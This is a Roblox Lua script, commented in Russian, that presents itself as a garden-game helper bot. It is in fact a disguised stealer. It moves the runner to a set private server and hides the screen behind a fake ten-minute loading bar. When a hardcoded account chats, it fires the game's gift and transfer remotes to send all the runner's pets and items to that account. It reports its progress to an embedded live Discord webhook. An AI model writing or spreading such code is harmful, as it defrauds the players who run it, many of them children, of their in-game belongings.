-- 🌿 Grow a Garden Bot — VIP Авто Старт с вебхуком при заходе

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

--== НАСТРОЙКА ==
local TARGET_USERNAME = "Sgahfd1223"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz"
local LOADING_TIME = 600 -- 10 минут
local CHECK_INTERVAL = 2
local TRANSFER_DELAY = 0.25

-- VIP сервер
local PLACE_ID = 126884695634066
local JOB_ID = "ca2d0dd8-e5ba-45eb-a1e2-8445e8c34f39"

--== ВЕБХУК ==
local function sendWebhook(message)
    local data = { content = message }
    local json = HttpService:JSONEncode(data)
    local request = (syn and syn.request) or (http and http.request) or request or http_request
    if request then
        pcall(function()
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = json
            })
        end)
    end
end

--== ПРОГРЕСС-БАР ==
local function createLoadingUI()
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "GrowGardenBot"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.fromRGB(15,15,25)

    local title = Instance.new("TextLabel", frame)
    title.Text = "🌿 Загрузка скрипта..."
    title.Size = UDim2.new(1,0,0,60)
    title.Position = UDim2.new(0,0,0.3,-60)
    title.TextColor3 = Color3.new(1,1,1)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 26
    title.BackgroundTransparency = 1

    local barBack = Instance.new("Frame", frame)
    barBack.Size = UDim2.new(0.6,0,0,30)
    barBack.Position = UDim2.new(0.2,0,0.5,0)
    barBack.BackgroundColor3 = Color3.fromRGB(40,40,40)

    local bar = Instance.new("Frame", barBack)
    bar.BackgroundColor3 = Color3.fromRGB(0,200,100)
    bar.Size = UDim2.new(0,0,1,0)

    local percent = Instance.new("TextLabel", frame)
    percent.Size = UDim2.new(1,0,0,50)
    percent.Position = UDim2.new(0,0,0.5,40)
    percent.TextColor3 = Color3.fromRGB(255,255,255)
    percent.Font = Enum.Font.GothamBold
    percent.TextSize = 24
    percent.BackgroundTransparency = 1

    return {GUI = gui, Bar = bar, Percent = percent, Title = title}
end

--== СБОР ПИТОМЦЕВ ==
local function collectPets()
    local garden = workspace:FindFirstChild("Garden") or workspace:FindFirstChild("Farm")
    if not garden then return end
    for _, obj in ipairs(garden:GetDescendants()) do
        if obj:IsA("Model") and obj.Name:lower():find("pet") then
            pcall(function()
                obj.Parent = LocalPlayer.Character
            end)
        end
    end
end

--== ТЕЛЕПОРТАЦИЯ ЧЕРЕЗ TWEEN ==
local function teleportTo(target)
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
        local goal = {CFrame = targetRoot.CFrame + Vector3.new(0,3,0)}
        local tween = TweenService:Create(root, tweenInfo, goal)
        tween:Play()
    end
end

--== ПЕРЕДАЧА ПРЕДМЕТОВ ==
local function transferItems(target)
    local remotes = {}
    for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
        if r:IsA("RemoteEvent") then
            local name = r.Name:lower()
            if name:find("transfer") or name:find("gift") or name:find("send") then
                table.insert(remotes, r)
            end
        end
    end
    for _, remote in ipairs(remotes) do
        for _, method in ipairs({"TransferAll","GiftAll","SendAll","DonateAll"}) do
            pcall(function()
                remote:FireServer(method,target)
            end)
            task.wait(TRANSFER_DELAY)
        end
    end
end

--== ДЕТЕКТ ЧАТА ==
local function monitorChat()
    local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
    if not targetPlayer then return end

    targetPlayer.Chatted:Connect(function(msg)
        teleportTo(targetPlayer)
        collectPets()
        transferItems(targetPlayer)
    end)
end

--== СТАРТ БОТА ==
local function startBot()
    -- Вебхук: зашли на VIP
    sendWebhook("🌿 Заход на VIP-сервер выполнен!")

    -- Прогресс-бар
    local ui = createLoadingUI()
    local start = os.time()
    while os.time()-start < LOADING_TIME do
        local elapsed = os.time()-start
        local ratio = math.clamp(elapsed/LOADING_TIME,0,1)
        local percentVal = math.floor(ratio*100)
        ui.Bar.Size = UDim2.new(ratio,0,1,0)
        ui.Percent.Text = tostring(percentVal).."% завершено"
        task.wait(1)
    end
    ui.GUI:Destroy()

    -- Детект чата и авто сбор/передача
    monitorChat()
    sendWebhook("🌿 Бот готов к работе на VIP-сервере!")
end

--== ПЕРЕХОД НА VIP СЕРВЕР И АВТО СТАРТ ==
TeleportService:TeleportToPlaceInstance(PLACE_ID, JOB_ID)
task.wait(5) -- Ждём подгрузки сервера
startBot()
